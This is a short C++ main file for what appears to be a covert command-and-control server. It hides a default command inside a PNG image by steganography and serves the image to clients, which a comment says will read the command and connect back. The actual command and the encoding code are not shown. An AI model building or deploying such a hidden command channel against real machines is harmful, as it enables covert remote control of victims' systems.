#ifndef SERVER_H
#include "server.h"
#include "stegImage.h"
#include <getopt.h>
#include <pthread.h>
#include "cli.h"

#endif

static struct option gLongOptions[] = {
    {"port", required_argument, NULL, 'p'},
    {"threads", required_argument, NULL, 't'},
    
};

int main(int argc, char *argv[]){
    int option_char = 0;           //Options (Need to implement later)
    std::string port = "8080";      //Port number to bind to
    int nthreads = 10;              //Worker threads (Will implement later)

    cli cliInterface;
    cliInterface.init(&cliInterface);
    //Create a thread for the CLI
    pthread_t cliThread;
    pthread_create(&cliThread, NULL,cli::cliPerform, &cliInterface);
    //Initial Command
    std::string command = DEFAULT_COMMAND;             //Default command to send client. Client will read this, and connect to us.
    std::string dImage = DEFAULT_RPATH;                //Default png file to edit
    std::string wImage = DEFAULT_PATH;                 //Default image client will request
    stegImage encodeImage;
    //Encode Initial Command into image
    encodeImage.readPNG(&dImage,command);   
    encodeImage.writePNG(&wImage);
    //Set the socket port/Maxpending connections
    Server socketServer(100,port);
    //Perform (Accept connects, perform GET/POST Requests)
    socketServer.perform();
    
}
